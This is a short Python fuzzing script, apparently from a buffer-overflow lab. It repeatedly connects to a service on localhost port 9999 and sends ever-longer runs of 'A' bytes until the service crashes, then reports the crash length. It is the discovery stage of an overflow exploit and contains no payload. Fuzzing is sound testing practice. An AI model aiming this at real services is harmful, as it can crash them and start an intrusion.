import socket
import time
import sys

buffer = b"A" * 100
target = '127.0.0.1'
port = 9999

while True:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.send((b"                          >> " + buffer))
        s.close()
        time.sleep(1)
        buffer = buffer + b"A" * 100
    except:
        print(f"Fuzzing crashed at {len(buffer)} bytes...")
        sys.exit(1)